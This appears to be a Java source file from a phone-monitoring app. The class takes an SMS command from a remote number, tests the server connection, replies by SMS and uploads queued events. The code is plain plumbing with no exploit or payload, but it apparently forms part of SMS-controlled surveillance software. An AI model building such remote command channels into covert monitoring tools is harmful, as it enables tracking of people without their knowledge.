package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.SendHeartBeatCmdResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.protsrv.SendEventManager;
import com.vvt.protsrv.SendHeartBeatManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSRequestHeartbeat extends RmtCmdAsync implements PhoenixProtocolListener {

	private SendHeartBeatManager heartbeatManager = Global.getSendHeartBeatManager();
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSRequestHeartbeat(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// Runnable
	public void run() {
		doSMSHeader(smsCmdCode.getRequestHeartbeatCmd());
		responseMessage.append(Constant.OK);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(RmtCmdTextResource.HEARTBEAT_PROCESSED);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		heartbeatManager.addListener(this);
		heartbeatManager.testConnection();				
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}

	// PhoenixProtocolListener
	public void onError(String message) {
//		Log.debug("CmdRequestHeartbeat.onError()", "ENTER");
		heartbeatManager.removeListener(this);
		doSMSHeader(smsCmdCode.getRequestHeartbeatCmd());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}

	public void onSuccess(CommandResponse response) {
		heartbeatManager.removeListener(this);
		doSMSHeader(smsCmdCode.getRequestHeartbeatCmd());		
		if (response instanceof SendHeartBeatCmdResponse) {
			SendHeartBeatCmdResponse sendHeartBeatRes = (SendHeartBeatCmdResponse)response;
			// TODO: Debug
//			saveLog(sendHeartBeatRes);
			if (sendHeartBeatRes.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.HEARTBEAT_COMPLETED);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendHeartBeatRes.getServerMsg());
			}
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
			// To send events
			eventSender.sendEvents();
		}
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdSetHeartbeat.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
//		Log.debug("CmdRequestHeartbeat.smsSendSuccess()", "ENTER");
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}

}
